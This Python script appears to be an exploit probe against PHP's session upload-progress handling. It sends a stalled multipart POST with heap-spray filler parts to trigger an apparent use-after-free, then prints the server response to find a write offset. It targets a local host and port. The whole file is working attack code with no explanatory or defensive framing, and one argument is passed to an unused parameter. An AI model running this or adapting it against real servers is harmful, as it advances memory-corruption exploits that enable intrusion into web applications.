#!/usr/bin/env python3
"""Probe: fire UAF body with marker-filler spray; the response reveals the write offset."""
import sys, socket, time, uuid, importlib
sys.path.insert(0, '.')
B = b'B7kQpoc618'
FILLER = b'\x41'  # 'A' repeated

def part(name, val, fn=None):
    d = f'Content-Disposition: form-data; name="{name}"'
    if fn is not None: d += f'; filename="{fn}"'
    return b'--' + B + b'\r\n' + d.encode() + b'\r\n\r\n' + val + b'\r\n'

def build(sid, spray_len, nspray, chunks, stall_after_c1=True):
    pre = part('PHPSESSID', sid.encode()) + part('PHP_SESSION_UPLOAD_PROGRESS', b'x') \
        + part('f', b'', 'a') + b'\r\n'
    c1 = b'A' * 5184
    spray = FILLER * spray_len
    tail = b'B' * 5184 + b'\r\n'
    for _ in range(nspray):
        tail += part('t[]', spray) + b'\r\n'
    tail += b'--' + B + b'--\r\n'
    return pre + c1, tail

def send(host, port, phase1, tail, stall):
    s = socket.create_connection((host, port), timeout=30)
    head = (f'POST / HTTP/1.1\r\nHost: h\r\n'
            f'Content-Type: multipart/form-data; boundary={B.decode()}\r\n'
            f'Content-Length: {len(phase1)+len(tail)}\r\nConnection: close\r\n\r\n').encode()
    s.sendall(head + phase1)
    time.sleep(stall)
    try: s.sendall(tail)
    except OSError: s.close(); return b'', 'TAIL-FAILED'
    s.settimeout(15); out = b''
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            out += d
    except socket.timeout: pass
    s.close(); return out, None

def main():
    spray_len = int(sys.argv[1]) if len(sys.argv) > 1 else 288
    nspray = int(sys.argv[2]) if len(sys.argv) > 2 else 90
    stall = float(sys.argv[3]) if len(sys.argv) > 3 else 1.4
    sid = 'probe' + uuid.uuid4().hex[:26]
    phase1, tail = build(sid, spray_len, nspray, stall)
    resp, err = send('127.0.0.1', 8080, phase1, tail, stall)
    body = resp.split(b'\r\n\r\n', 1)[-1] if resp else b''
    print(f'### PROBE spray_len={spray_len} nspray={nspray} SID={sid} ERR={err}')
    print(body.decode('latin1', 'replace')[:2000])

if __name__ == '__main__':
    main()
